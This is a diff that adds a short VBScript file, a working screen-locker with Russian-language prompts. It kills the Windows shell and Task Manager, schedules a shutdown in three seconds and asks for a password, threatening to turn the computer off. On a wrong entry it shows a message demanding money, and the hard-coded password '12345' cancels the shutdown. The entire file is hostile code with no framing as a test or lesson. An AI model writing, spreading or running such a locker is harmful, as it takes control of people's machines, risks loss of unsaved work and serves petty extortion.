@@ -1,0 +1,13 @@
+set t=createobject("Wscript.Shell")
+set kill = createobject("wscript.shell")
+kill.run"taskkill /f /im explorer.exe"
+kill.run"taskkill /f /im taskmgr.exe"
+pass = InputBox ("Введи пароль или вырублю комп")
+kill.run"shutdown /s /t 3"
+if pass <> "12345" then
+msgbox "Error!", 16,"Отдай сотку!"
+else
+t.run"shutdown -a"
+msgbox"Прощаю тебя", 16,"Пароль принят!"
+t.run"explorer"
+end if
